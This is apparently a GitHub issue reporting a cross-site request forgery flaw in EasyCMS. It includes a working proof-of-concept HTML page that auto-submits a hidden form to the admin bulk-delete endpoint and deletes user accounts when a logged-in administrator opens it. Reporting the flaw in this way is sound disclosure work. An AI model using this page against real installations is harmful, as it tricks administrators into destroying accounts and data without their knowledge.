## Description

[![@chenrui1896](https://avatars.githubusercontent.com/u/33108041?v=4&size=48)](/chenrui1896)[chenrui1896](https://github.com/chenrui1896)opened [on Jun 28, 2018](https://github.com/TeamEasy/EasyCMS/issues/3#issue-336581022)
### In this case, the POC is "a.html".After admin login,when he open "a.html",he will delete user. Let's see it.

First I add 3 user accounts as ID 6,7,8

[![image](https://user-images.githubusercontent.com/33108041/42030953-158cf290-7b07-11e8-9dc7-b18c05711330.png)](https://user-images.githubusercontent.com/33108041/42030953-158cf290-7b07-11e8-9dc7-b18c05711330.png)

We can delete these accounts by submiting this html form.

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1:82/easy/index.php?s=/admin/user/delAll" method="POST">
      <input type="hidden" name="ids&#91;&#93;" value="8" />
      <input type="hidden" name="ids&#91;&#93;" value="7" />
      <input type="hidden" name="ids&#91;&#93;" value="6" />
      <input type="submit" value="Submit request" />
    </form>
       <script> document.forms[0].submit(); </script>
  </body>
</html>

```

Then the user accounts had been deleted!!!
